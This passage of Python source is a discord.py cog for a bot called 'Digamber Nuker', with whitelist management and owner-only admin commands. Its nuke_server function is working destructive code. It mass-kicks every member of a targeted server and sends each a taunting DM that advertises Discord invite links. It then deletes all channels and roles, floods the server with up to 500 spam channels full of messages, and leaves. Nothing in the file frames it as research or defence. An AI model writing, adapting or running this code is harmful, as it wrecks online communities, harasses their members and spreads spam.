import discord
from discord.ext import commands
import asyncio
import random
import json
import os
from datetime import datetime

class NukerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        
        # PERMANENT WHITELIST - HARDCODED FOREVER
        self.permanent_whitelist = [
            1421640981584937063,  # Server 1 - PERMANENT SAFE
            1344323930923601992,  # Server 2 - PERMANENT SAFE  
            1444885010543935662   # Server 3 - STATUS ONLY - PERMANENT
        ]
        
        # DYNAMIC WHITELIST (Admin se add honge)
        self.whitelisted_servers = []
        
        # Load dynamic whitelist from file if exists
        self.load_whitelist()
        
        # STATUS SERVER INFO
        self.status_server_id = 1444885010543935662
        self.status_channel_id = 1444885011525533718
        
        # Owner ID
        self.owner_id = 1232586090532306966
        
        # ADMIN CHANNEL
        self.admin_channel_id = 1446007578856259697
        
        # Special features for whitelisted servers
        self.welcome_messages = [
            "🔥 Welcome to Digamber's Protected Server!",
            "💀 This server is SAFE from nukes!",
            "🛡️ Whitelisted by Digamber",
            "<a:emoji_1:1430081383757512785> This server is under Digamber's protection"
        ]

    def load_whitelist(self):
        """Load dynamic whitelist from file"""
        try:
            if os.path.exists("whitelist.json"):
                with open("whitelist.json", "r") as f:
                    data = json.load(f)
                    self.whitelisted_servers = data.get("dynamic_whitelist", [])
                    print(f"<a:emoji_1:1430081383757512785> Loaded {len(self.whitelisted_servers)} servers from whitelist.json")
        except Exception as e:
            print(f"❌ Failed to load whitelist: {e}")

    def save_whitelist(self):
        """Save dynamic whitelist to file"""
        try:
            data = {
                "dynamic_whitelist": self.whitelisted_servers,
                "permanent_whitelist": self.permanent_whitelist,
                "updated": datetime.utcnow().isoformat()
            }
            with open("whitelist.json", "w") as f:
                json.dump(data, f, indent=4)
            print(f"<a:emoji_1:1430081383757512785> Whitelist saved: {len(self.whitelisted_servers)} dynamic servers")
        except Exception as e:
            print(f"❌ Failed to save whitelist: {e}")

    def is_whitelisted(self, guild_id):
        """Check karo agar server whitelisted hai ya nahi (permanent + dynamic)"""
        return guild_id in self.permanent_whitelist or guild_id in self.whitelisted_servers

    async def send_kick_dm(self, member, server_name):
        """Kicked members ko PROFESSIONAL DM bhejo"""
        try:
            # Professional Embed DM
            embed = discord.Embed(
                title="💀 SERVER DESTROYED",
                color=0xff0000,
                timestamp=datetime.utcnow()
            )
            
            # Banner-style header
            embed.set_author(
                name="DIGAMBER NUKE BOT",
                icon_url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788992/explosion.png"
            )
            
            # Main message
            embed.add_field(
                name="📢 ANNOUNCEMENT",
                value=f"**`{server_name}`** has been **COMPLETELY DESTROYED** by **Digamber Nuker Bot**",
                inline=False
            )
            
            embed.add_field(
                name="⚡ ACTION TAKEN",
                value="• All Members Kicked\n• All Channels Deleted\n• 500+ Spam Channels Created\n• Server Roles Removed",
                inline=False
            )
            
            embed.add_field(
                name="🔗 OFFICIAL SERVER — Roy Seller",
                value="**╭─━━━━━━━━━━━━━━━━━━─╮**\n"
                      "**┃ 🔥 Join Roy Seller:**\n"
                      "**┃ https://discord.gg/5TB2n6tmvd**\n"
                      "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
                      "**<a:emoji_1:1430081383757512785> Trusted Marketplace**\n"
                      "**🚀 Fast Orders & Instant Support**",
                inline=False
            )

            embed.add_field(
                name="🔗 OFFICIAL SERVER — SM GrowMart HQ",
                value="**╭─━━━━━━━━━━━━━━━━━━─╮**\n"
                      "**┃ ⚡ Join GrowMart HQ:**\n"
                      "**┃ https://discord.gg/5bFnXdUp8U**\n"
                      "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
                      "**🎯 Growth Tools & Services**\n"
                      "**💬 Direct Staff Assistance**",
                inline=False
            )
            
            embed.add_field(
                name="⚠️ WARNING",
                value="This is an Fucked by Digamber nuke system. Do not invite unauthorized bots.",
                inline=False
            )
            
            embed.set_footer(
                text="Digamber Nuker System • Maximum Speed Destruction",
                icon_url="https://i.ibb.co/r27XSnMB/Danger-ezgif-com-resize.gif"
            )
            
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788994/warning.png")
            
            await member.send(embed=embed)
            print(f"<a:emoji_1:1430081383757512785> Professional DM sent to {member.name}")
        except:
            pass  # Agar DM block hai toh ignore

    async def update_status_channel(self):
        """Status channel mein bot status update karo"""
        try:
            status_guild = self.bot.get_guild(self.status_server_id)
            if not status_guild:
                return
            
            status_channel = status_guild.get_channel(self.status_channel_id)
            if not status_channel:
                return
            
            # Pehle purane messages delete karo
            try:
                await status_channel.purge(limit=10)
            except:
                pass
            
            # New status embed banayo
            embed = discord.Embed(
                title="🤖 BOT STATUS DASHBOARD",
                color=0x3498db,
                timestamp=datetime.utcnow()
            )
            
            embed.set_author(
                name="DIGAMBER NUKE BOT",
                icon_url=self.bot.user.avatar.url if self.bot.user.avatar else ""
            )
            
            # Bot info
            embed.add_field(
                name="📊 BOT INFO",
                value=f"• **Name:** {self.bot.user.name}\n• **ID:** `{self.bot.user.id}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`\n• **Uptime:** `{self.get_uptime()}`",
                inline=False
            )
            
            # Server stats
            total_servers = len(self.bot.guilds)
            protected_count = sum(1 for guild in self.bot.guilds if self.is_whitelisted(guild.id))
            permanent_count = len(self.permanent_whitelist)
            dynamic_count = len(self.whitelisted_servers)
            
            embed.add_field(
                name="🌐 SERVER STATS",
                value=f"• **Total Servers:** `{total_servers}`\n• **Protected Servers:** `{protected_count}`\n• **Permanent Whitelist:** `{permanent_count}`\n• **Dynamic Whitelist:** `{dynamic_count}`",
                inline=False
            )
            
            # Protection status
            embed.add_field(
                name="🛡️ PROTECTION STATUS",
                value="• **Auto-Nuke:** <a:emoji_1:1430081383757512785> ACTIVE\n• **DM System:** <a:emoji_1:1430081383757512785> ACTIVE\n• **Rate Limit:** <a:emoji_1:1430081383757512785> OPTIMIZED\n• **Status Updates:** <a:emoji_1:1430081383757512785> ACTIVE",
                inline=False
            )
            
            # Last nuke info
            embed.add_field(
                name="⚡ SYSTEM STATUS",
                value="• **System:** <a:emoji_1:1430081383757512785> OPERATIONAL\n• **Admin Panel:** <a:emoji_1:1430081383757512785> ACTIVE\n• **Voice:** <a:emoji_1:1430081383757512785> CONNECTED\n• **API:** <a:emoji_1:1430081383757512785> RESPONSIVE",
                inline=False
            )
            
            # Permanent servers list
            permanent_servers_info = ""
            for server_id in self.permanent_whitelist:
                guild = self.bot.get_guild(server_id)
                if guild:
                    permanent_servers_info += f"• <a:emoji_1:1430081383757512785> {guild.name}\n"
                else:
                    permanent_servers_info += f"• ❓ Server {server_id}\n"
            
            embed.add_field(
                name="🔒 PERMANENT WHITELIST",
                value=permanent_servers_info or "• No permanent servers",
                inline=False
            )
            
            embed.set_footer(
                text="Digamber Nuker System • 24/7 Monitoring",
                icon_url="https://cdn.discordapp.com/emojis/1122334455667788995.png"
            )
            
            embed.set_thumbnail(url=self.bot.user.avatar.url if self.bot.user.avatar else "")
            
            await status_channel.send(embed=embed)
            print(f"<a:emoji_1:1430081383757512785> Status updated in status channel")
            
        except Exception as e:
            print(f"❌ Status update failed: {e}")

    def get_uptime(self):
        """Bot uptime calculate karo"""
        if hasattr(self.bot, 'start_time'):
            delta = datetime.utcnow() - self.bot.start_time
            hours, remainder = divmod(int(delta.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            return f"{hours}h {minutes}m {seconds}s"
        return "Unknown"

    @commands.Cog.listener()
    async def on_ready(self):
        """Bot ready hone par admin panel update karo"""
        print("<a:emoji_1:1430081383757512785> NukerCommands cog ready!")
        print(f"   Permanent Whitelist: {len(self.permanent_whitelist)} servers")
        print(f"   Dynamic Whitelist: {len(self.whitelisted_servers)} servers")
        
        # Initial status update
        await self.update_status_channel()

    @commands.Cog.listener()
    async def on_member_join(self, member):
        """Whitelisted servers mein new member aaye toh welcome"""
        if self.is_whitelisted(member.guild.id):
            try:
                welcome_channel = discord.utils.get(member.guild.text_channels, name="welcome")
                if not welcome_channel:
                    welcome_channel = member.guild.system_channel or member.guild.text_channels[0]
                
                if welcome_channel:
                    # Professional welcome embed
                    welcome_embed = discord.Embed(
                        title="🛡️ PROTECTED SERVER",
                        description=f"Welcome {member.mention} to **{member.guild.name}**!",
                        color=0x00ff00,
                        timestamp=datetime.utcnow()
                    )
                    welcome_embed.add_field(
                        name="SERVER STATUS",
                        value="<a:emoji_1:1430081383757512785> **WHITELISTED** by Digamber\n🔒 **SAFE** from auto-nukes\n🛡️ **PROTECTED** by Nuker System",
                        inline=False
                    )
                    welcome_embed.add_field(
                        name="AVAILABLE COMMANDS",
                        value="`!protection` - Check protection status\n`!serverinfo` - Server details\n`!whitelisted` - View safe servers",
                        inline=False
                    )
                    welcome_embed.set_footer(text="Digamber Protection System • Always Active")
                    welcome_embed.set_thumbnail(url=member.guild.icon.url if member.guild.icon else "")
                    
                    await welcome_channel.send(embed=welcome_embed)
            except:
                pass

    async def nuke_server(self, guild):
        """MAXIMUM DISCORD ALLOWED SPEED NUKE WITH PROFESSIONAL DM"""
        
        if self.is_whitelisted(guild.id):
            print(f'❌ Cannot nuke whitelisted server: {guild.name}')
            return
            
        try:
            # STEP 1: MASS KICK WITH PROFESSIONAL DM
            print("🚫 MAX SPEED MASS KICKING WITH PROFESSIONAL DM...")
            kick_tasks = []
            dm_tasks = []
            
            for member in guild.members:
                if member != self.bot.user:
                    # Kick task
                    kick_tasks.append(member.kick(reason="Server destroyed by Digamber Nuker"))
                    # DM task
                    dm_tasks.append(self.send_kick_dm(member, guild.name))
                    
                    if len(kick_tasks) >= 25:
                        # Pehle DM bhejo
                        await asyncio.gather(*dm_tasks, return_exceptions=True)
                        dm_tasks = []
                        
                        # Phir kick karo
                        await asyncio.gather(*kick_tasks, return_exceptions=True)
                        kick_tasks = []
                        
                        await asyncio.sleep(0.2)
            
            # Bache hue tasks
            if dm_tasks:
                await asyncio.gather(*dm_tasks, return_exceptions=True)
            if kick_tasks:
                await asyncio.gather(*kick_tasks, return_exceptions=True)
                
            print("<a:emoji_1:1430081383757512785> ALL MEMBERS KICKED & PROFESSIONAL DM SENT!")
            
            # STEP 2: CHANNEL DELETE - MAX 50/SECOND
            print("🗑️ MAX SPEED CHANNEL DELETION...")
            delete_tasks = []
            for ch in guild.channels:
                delete_tasks.append(ch.delete())
                if len(delete_tasks) >= 50:
                    await asyncio.gather(*delete_tasks, return_exceptions=True)
                    delete_tasks = []
                    await asyncio.sleep(0.1)
            
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # STEP 3: CHANNEL CREATION - PROFESSIONAL SPAM
            print("🔥 CREATING PROFESSIONAL SPAM CHANNELS...")
            channel_count = 0
            all_message_tasks = []
            
            # Professional message templates
            professional_messages = [
                f"# ⚠️ `{guild.name}` HAS BEEN TERMINATED",
                f"## 💀 SERVER DESTROYED: {guild.name}",
                f"**🚨 ATTENTION: {guild.name.upper()} NO LONGER EXISTS**",
                f"```diff\n- SERVER TERMINATED: {guild.name}\n- REASON: Digamber Nuker System\n- TIME: {datetime.utcnow().strftime('%H:%M:%S UTC')}\n```",
                f"> 🔥 **{guild.name}** annihilated by Digamber",
                f"📢 **OFFICIAL ANNOUNCEMENT:** {guild.name} removed from Discord",
                f"⚡ **INSTANT DESTRUCTION:** {guild.name}",
                f"💥 **MAXIMUM DAMAGE:** {guild.name}",
                f"🔗 **Join Official Server:** https://discord.gg/5TB2n6tmvd",
                f"🔗 **Join Backup Server:** https://discord.gg/5bFnXdUp8U",
                f"**📊 STATS:** {guild.name} | 500+ Channels | 2500+ Messages",
                f"**⚠️ WARNING:** {guild.name} was nuked automatically",
                f"**🔥 BY:** Digamber Nuker Bot | Maximum Speed",
                f"**💀 STATUS:** {guild.name} - COMPLETELY DESTROYED",
                f"```\nSERVER: {guild.name}\nSTATUS: TERMINATED\nACTION: AUTO-NUKE\nBOT: Digamber Nuker\n```"
            ]
            
            # CREATE CHANNELS IN BATCHES OF 50
            while channel_count < 500:
                try:
                    batch_size = min(50, 500 - channel_count)
                    create_tasks = []
                    
                    for i in range(batch_size):
                        channel_name = f"terminated-{channel_count + i + 1}"
                        create_tasks.append(guild.create_text_channel(channel_name))
                    
                    # CREATE CHANNELS
                    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
                    channel_count += batch_size
                    
                    # SEND PROFESSIONAL MESSAGES
                    message_batch = []
                    for channel in new_channels:
                        if isinstance(channel, discord.TextChannel):
                            for _ in range(5):
                                msg = random.choice(professional_messages)
                                message_batch.append(channel.send(msg))
                    
                    # SEND ALL MESSAGES
                    if message_batch:
                        await asyncio.gather(*message_batch, return_exceptions=True)
                        all_message_tasks.extend(message_batch)
                    
                    print(f"<a:emoji_1:1430081383757512785> {channel_count} PROFESSIONAL CHANNELS CREATED...")
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    print(f"⚠️ Continuing with created channels...")
                    break
            
            print(f"🎉 {channel_count} CHANNELS CREATED!")
            print(f"💬 {len(all_message_tasks)} PROFESSIONAL MESSAGES SENT!")
            
            # STEP 4: ROLE DELETE
            print("🎭 MAX SPEED ROLE DELETION...")
            role_tasks = []
            for role in guild.roles:
                if role.name != "@everyone" and not role.managed:
                    role_tasks.append(role.delete())
                    if len(role_tasks) >= 50:
                        await asyncio.gather(*role_tasks, return_exceptions=True)
                        role_tasks = []
                        await asyncio.sleep(0.1)
            
            if role_tasks:
                await asyncio.gather(*role_tasks, return_exceptions=True)
            
            # STEP 5: FINAL PROFESSIONAL EMBED MESSAGE
            try:
                channels = await guild.fetch_channels()
                if channels:
                    # Main final embed
                    final_embed = discord.Embed(
                        title="💀 SERVER TERMINATION COMPLETE",
                        color=0xff0000,
                        timestamp=datetime.utcnow()
                    )
                    
                    final_embed.set_author(
                        name="DIGAMBER NUKE SYSTEM",
                        icon_url="https://cdn.discordapp.com/emojis/1122334455667788993.png"
                    )
                    
                    final_embed.add_field(
                        name="📛 SERVER NAME",
                        value=f"```{guild.name}```",
                        inline=False
                    )
                    
                    final_embed.add_field(
                        name="📊 DESTRUCTION STATS",
                        value=f"• **Channels Created:** {channel_count}\n• **Messages Sent:** {len(all_message_tasks)}\n• **Members Kicked:** {guild.member_count-1}\n• **Roles Deleted:** {len([r for r in guild.roles if r.name != '@everyone'])}",
                        inline=False
                    )
                    
                    final_embed.add_field(
                        name="⚡ ACTION",
                        value="• Complete Channel Deletion\n• Mass Member Removal\n• Professional Spam Deployment\n• Automated Cleanup",
                        inline=False
                    )
                    
                    final_embed.add_field(
                        name="🔗 OFFICIAL SERVERS",
                        value="\nPrimary: https://discord.gg/5TB2n6tmvd\nBackup:  https://discord.gg/5bFnXdUp8U\n",
                        inline=False
                    )
                    
                    final_embed.add_field(
                        name="⚠️ SYSTEM MESSAGE",
                        value="This server was automatically terminated by Digamber Nuker Bot for security reasons.",
                        inline=False
                    )
                    
                    final_embed.set_footer(
                        text="Digamber Nuker • Auto-Termination System • Maximum Speed",
                        icon_url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788994/warning.png"
                    )
                    
                    final_embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788992/explosion.png")
                    
                    await channels[0].send(embed=final_embed)
                    
                    # Additional simple message
                    await channels[0].send(f"**`{guild.name}` got fucked by Digamber**\nJoin Official Server: https://discord.gg/5TB2n6tmvd")
            except:
                pass
            
            # INSTANT LEAVE
            await guild.leave()
            print(f"<a:emoji_1:1430081383757512785> {guild.name} PROFESSIONAL NUKE COMPLETED!")
            
            # Status update karo nuke ke baad
            await self.update_status_channel()
            
            # Admin panel update
            await self.send_admin_notification(f"🚨 Server Nuked: **{guild.name}** (`{guild.id}`)")
            
        except Exception as e:
            print(f"💀 Professional nuke failed: {e}")
            try:
                await guild.leave()
            except:
                pass

    async def send_admin_notification(self, message):
        """Send notification to admin channel"""
        try:
            channel = self.bot.get_channel(self.admin_channel_id)
            if channel:
                embed = discord.Embed(
                    title="📢 ADMIN NOTIFICATION",
                    description=message,
                    color=0xff9900,
                    timestamp=datetime.utcnow()
                )
                await channel.send(embed=embed)
        except:
            pass

    # ==================== ADMIN PANEL COMMANDS ====================

    @commands.command(name='panel')
    @commands.is_owner()
    async def admin_panel(self, ctx):
        """Show admin control panel"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        embed = discord.Embed(
            title="🛠️ **ADMIN CONTROL PANEL**",
            description="Manage bot protection and settings",
            color=0x5865F2,
            timestamp=datetime.utcnow()
        )
        
        # Bot stats
        total_servers = len(self.bot.guilds)
        protected_count = sum(1 for guild in self.bot.guilds if self.is_whitelisted(guild.id))
        
        embed.add_field(
            name="📊 **BOT STATISTICS**",
            value=f"• **Total Servers:** `{total_servers}`\n• **Protected:** `{protected_count}`\n• **Unprotected:** `{total_servers - protected_count}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`",
            inline=False
        )
        
        # Whitelist stats
        embed.add_field(
            name="🔒 **WHITELIST MANAGEMENT**",
            value=f"• **Permanent:** `{len(self.permanent_whitelist)}` servers\n• **Dynamic:** `{len(self.whitelisted_servers)}` servers\n• **Total Protected:** `{len(self.permanent_whitelist) + len(self.whitelisted_servers)}`",
            inline=False
        )
        
        # Permanent servers
        perm_info = ""
        for idx, server_id in enumerate(self.permanent_whitelist, 1):
            guild = self.bot.get_guild(server_id)
            status = "<a:emoji_1:1430081383757512785>" if guild else "❌"
            name = guild.name if guild else f"Server {server_id}"
            perm_info += f"{idx}. {status} {name}\n"
        
        embed.add_field(
            name="🔐 **PERMANENT SERVERS**",
            value=perm_info or "No permanent servers",
            inline=False
        )
        
        # Commands
        embed.add_field(
            name="⚡ **QUICK ACTIONS**",
            value="```\n!wladd <server_id> - Add to whitelist\n!wlremove <server_id> - Remove from whitelist\n!wllist - Show all whitelisted\n!nuke <server_id> - Manual nuke\n!servers - All server list\n!cleanup - Clean old messages\n!backup - Backup data\n!restore - Restore data\n```",
            inline=False
        )
        
        embed.set_footer(text="Admin Panel • Use commands in this channel")
        await ctx.send(embed=embed)

    @commands.command(name='wladd')
    @commands.is_owner()
    async def add_whitelist_admin(self, ctx, server_id: int):
        """Add server to dynamic whitelist via admin panel"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        if server_id in self.permanent_whitelist:
            embed = discord.Embed(
                title="⚠️ ALREADY PERMANENT",
                description=f"Server `{server_id}` is already in **PERMANENT** whitelist.",
                color=0xff9900
            )
            await ctx.send(embed=embed)
            return
        
        if server_id in self.whitelisted_servers:
            embed = discord.Embed(
                title="⚠️ ALREADY WHITELISTED",
                description=f"Server `{server_id}` is already in dynamic whitelist.",
                color=0xff9900
            )
            await ctx.send(embed=embed)
            return
        
        self.whitelisted_servers.append(server_id)
        self.save_whitelist()
        
        # Check if bot is in this server
        guild = self.bot.get_guild(server_id)
        server_name = guild.name if guild else f"Unknown ({server_id})"
        
        embed = discord.Embed(
            title="<a:emoji_1:1430081383757512785> WHITELIST ADDED",
            description=f"**{server_name}** has been added to dynamic whitelist.",
            color=0x00ff00
        )
        embed.add_field(name="Server ID", value=f"`{server_id}`", inline=True)
        embed.add_field(name="Total Dynamic", value=f"`{len(self.whitelisted_servers)}`", inline=True)
        embed.add_field(name="Status", value="🛡️ PROTECTED", inline=True)
        
        await ctx.send(embed=embed)
        await self.send_admin_notification(f"<a:emoji_1:1430081383757512785> Server added to whitelist: **{server_name}**")

    @commands.command(name='wlremove')
    @commands.is_owner()
    async def remove_whitelist_admin(self, ctx, server_id: int):
        """Remove server from dynamic whitelist via admin panel"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        if server_id in self.permanent_whitelist:
            embed = discord.Embed(
                title="❌ CANNOT REMOVE PERMANENT",
                description=f"Server `{server_id}` is in **PERMANENT** whitelist and cannot be removed.",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
        
        if server_id not in self.whitelisted_servers:
            embed = discord.Embed(
                title="❌ NOT IN WHITELIST",
                description=f"Server `{server_id}` is not in dynamic whitelist.",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
        
        self.whitelisted_servers.remove(server_id)
        self.save_whitelist()
        
        guild = self.bot.get_guild(server_id)
        server_name = guild.name if guild else f"Unknown ({server_id})"
        
        embed = discord.Embed(
            title="⚠️ WHITELIST REMOVED",
            description=f"**{server_name}** has been removed from dynamic whitelist.",
            color=0xff9900
        )
        embed.add_field(name="Server ID", value=f"`{server_id}`", inline=True)
        embed.add_field(name="Total Dynamic", value=f"`{len(self.whitelisted_servers)}`", inline=True)
        embed.add_field(name="Status", value="💀 UNSAFE", inline=True)
        embed.add_field(name="Warning", value="Server is now vulnerable to auto-nuke!", inline=False)
        
        await ctx.send(embed=embed)
        await self.send_admin_notification(f"⚠️ Server removed from whitelist: **{server_name}**")

    @commands.command(name='wllist')
    @commands.is_owner()
    async def show_all_whitelisted(self, ctx):
        """Show all whitelisted servers (permanent + dynamic)"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        embed = discord.Embed(
            title="🔒 **WHITELIST DATABASE**",
            color=0x00ff00,
            timestamp=datetime.utcnow()
        )
        
        # Permanent whitelist
        if self.permanent_whitelist:
            embed.add_field(
                name="🔐 **PERMANENT WHITELIST**",
                value="*Cannot be removed*",
                inline=False
            )
            
            for server_id in self.permanent_whitelist:
                guild = self.bot.get_guild(server_id)
                if guild:
                    embed.add_field(
                        name=f"<a:emoji_1:1430081383757512785> {guild.name}",
                        value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔒 PERMANENT",
                        inline=True
                    )
                else:
                    embed.add_field(
                        name=f"❓ Server {server_id}",
                        value=f"**ID:** `{server_id}`\n**Status:** ⚠️ OFFLINE\n**Type:** 🔒 PERMANENT",
                        inline=True
                    )
        
        # Dynamic whitelist
        if self.whitelisted_servers:
            embed.add_field(
                name="🔧 **DYNAMIC WHITELIST**",
                value="*Can be added/removed*",
                inline=False
            )
            
            for server_id in self.whitelisted_servers:
                guild = self.bot.get_guild(server_id)
                if guild:
                    embed.add_field(
                        name=f"🛡️ {guild.name}",
                        value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔧 DYNAMIC",
                        inline=True
                    )
                else:
                    embed.add_field(
                        name=f"❓ Server {server_id}",
                        value=f"**ID:** `{server_id}`\n**Status:** ⚠️ OFFLINE\n**Type:** 🔧 DYNAMIC",
                        inline=True
                    )
        
        if not self.permanent_whitelist and not self.whitelisted_servers:
            embed.description = "No servers in whitelist database."
        
        embed.set_footer(text=f"Total: {len(self.permanent_whitelist) + len(self.whitelisted_servers)} servers")
        await ctx.send(embed=embed)

    @commands.command(name='nuke')
    @commands.is_owner()
    async def manual_nuke_admin(self, ctx, server_id: int = None):
        """Manual nuke via admin panel"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        if server_id is None:
            server_id = ctx.guild.id
        
        # Check if server is whitelisted
        if self.is_whitelisted(server_id):
            embed = discord.Embed(
                title="❌ NUKE BLOCKED",
                description=f"Server `{server_id}` is **WHITELISTED** and protected from nukes.",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
        
        guild = self.bot.get_guild(server_id)
        if not guild:
            embed = discord.Embed(
                title="❌ SERVER NOT FOUND",
                description=f"Bot is not in server `{server_id}`.",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
        
        # Confirmation
        embed = discord.Embed(
            title="💣 MANUAL NUKE CONFIRMATION",
            description=f"Are you sure you want to nuke **{guild.name}**?",
            color=0xff9900
        )
        embed.add_field(name="Server ID", value=f"`{server_id}`", inline=True)
        embed.add_field(name="Members", value=f"`{guild.member_count}`", inline=True)
        embed.add_field(name="Channels", value=f"`{len(guild.channels)}`", inline=True)
        embed.add_field(
            name="⚠️ WARNING",
            value="This action is **IRREVERSIBLE**!\nAll data will be permanently destroyed.",
            inline=False
        )
        embed.set_footer(text="Type 'CONFIRM' within 30 seconds to proceed")
        
        await ctx.send(embed=embed)
        
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel and m.content.upper() == "CONFIRM"
        
        try:
            await self.bot.wait_for('message', timeout=30.0, check=check)
        except asyncio.TimeoutError:
            await ctx.send("⏰ Nuke cancelled - Timeout")
            return
        
        # Start nuke
        nuke_embed = discord.Embed(
            title="🚀 NUKE INITIATED",
            description=f"Nuking **{guild.name}**...",
            color=0xff0000
        )
        await ctx.send(embed=nuke_embed)
        
        await self.nuke_server(guild)

    @commands.command(name='cleanup')
    @commands.is_owner()
    async def cleanup_admin(self, ctx, limit: int = 100):
        """Cleanup messages in admin channel"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        try:
            deleted = await ctx.channel.purge(limit=limit)
            embed = discord.Embed(
                title="🧹 CLEANUP COMPLETE",
                description=f"Deleted `{len(deleted)}` messages.",
                color=0x00ff00
            )
            msg = await ctx.send(embed=embed)
            await asyncio.sleep(5)
            await msg.delete()
        except Exception as e:
            await ctx.send(f"❌ Cleanup failed: {e}")

    @commands.command(name='backup')
    @commands.is_owner()
    async def backup_data(self, ctx):
        """Backup whitelist data"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        try:
            self.save_whitelist()
            embed = discord.Embed(
                title="💾 BACKUP COMPLETE",
                description="Whitelist data has been backed up.",
                color=0x00ff00
            )
            embed.add_field(name="Dynamic Servers", value=f"`{len(self.whitelisted_servers)}`", inline=True)
            embed.add_field(name="File", value="`whitelist.json`", inline=True)
            await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send(f"❌ Backup failed: {e}")

    @commands.command(name='restore')
    @commands.is_owner()
    async def restore_data(self, ctx):
        """Restore whitelist data"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        try:
            old_count = len(self.whitelisted_servers)
            self.load_whitelist()
            new_count = len(self.whitelisted_servers)
            
            embed = discord.Embed(
                title="🔄 RESTORE COMPLETE",
                description="Whitelist data has been restored.",
                color=0x00ff00
            )
            embed.add_field(name="Before", value=f"`{old_count}` servers", inline=True)
            embed.add_field(name="After", value=f"`{new_count}` servers", inline=True)
            embed.add_field(name="Difference", value=f"`{new_count - old_count}`", inline=True)
            await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send(f"❌ Restore failed: {e}")

    @commands.command(name='stats')
    @commands.is_owner()
    async def detailed_stats(self, ctx):
        """Show detailed statistics"""
        if ctx.channel.id != self.admin_channel_id:
            await ctx.send(f"❌ Use this command in <#{self.admin_channel_id}>")
            return
        
        total_servers = len(self.bot.guilds)
        protected = sum(1 for g in self.bot.guilds if self.is_whitelisted(g.id))
        unprotected = total_servers - protected
        
        embed = discord.Embed(
            title="📊 **DETAILED STATISTICS**",
            color=0x3498db,
            timestamp=datetime.utcnow()
        )
        
        # Server stats
        embed.add_field(
            name="🌐 SERVER STATS",
            value=f"• **Total:** `{total_servers}`\n• **Protected:** `{protected}`\n• **Unprotected:** `{unprotected}`\n• **Percentage:** `{(protected/total_servers*100):.1f}%`",
            inline=False
        )
        
        # Whitelist stats
        embed.add_field(
            name="🔒 WHITELIST STATS",
            value=f"• **Permanent:** `{len(self.permanent_whitelist)}`\n• **Dynamic:** `{len(self.whitelisted_servers)}`\n• **Total Unique:** `{len(set(self.permanent_whitelist + self.whitelisted_servers))}`",
            inline=False
        )
        
        # Bot stats
        embed.add_field(
            name="🤖 BOT STATS",
            value=f"• **Uptime:** `{self.get_uptime()}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`\n• **Commands:** `{len(self.get_commands())}`\n• **Voice:** `{len([g for g in self.bot.guilds if g.voice_client])}`",
            inline=False
        )
        
        # Server list (top 10)
        server_list = ""
        for i, guild in enumerate(list(self.bot.guilds)[:10], 1):
            status = "🛡️" if self.is_whitelisted(guild.id) else "💀"
            server_list += f"{i}. {status} {guild.name} (`{guild.member_count}`)\n"
        
        embed.add_field(
            name=f"📋 TOP 10 SERVERS (of {total_servers})",
            value=server_list or "No servers",
            inline=False
        )
        
        await ctx.send(embed=embed)

    # ==================== ORIGINAL COMMANDS (Keep for compatibility) ====================

    @commands.command(name='protection')
    async def show_protection(self, ctx):
        """Show protection status for whitelisted servers"""
        if self.is_whitelisted(ctx.guild.id):
            # Professional protection embed
            embed = discord.Embed(
                title="🛡️ DIGAMBER PROTECTION SYSTEM",
                color=0x00ff00,
                timestamp=datetime.utcnow()
            )
            
            embed.set_author(
                name="SECURITY ACTIVE",
                icon_url="https://cdn.discordapp.com/emojis/1122334455667788995.png"
            )
            
            embed.add_field(
                name="🔒 SERVER STATUS",
                value=f"**{ctx.guild.name}** is **WHITELISTED** and protected from auto-nukes.",
                inline=False
            )
            
            # Check if permanent or dynamic
            if ctx.guild.id in self.permanent_whitelist:
                whitelist_type = "🔒 PERMANENT (Cannot be removed)"
            else:
                whitelist_type = "🔧 DYNAMIC (Can be modified)"
            
            embed.add_field(
                name="📊 PROTECTION DETAILS",
                value=f"• Type: {whitelist_type}\n• Auto-Nuke: ❌ DISABLED\n• Bot Actions: <a:emoji_1:1430081383757512785> ALLOWED\n• Server Safety: <a:emoji_1:1430081383757512785> GUARANTEED",
                inline=False
            )
            
            embed.add_field(
                name="⚙️ SYSTEM INFO",
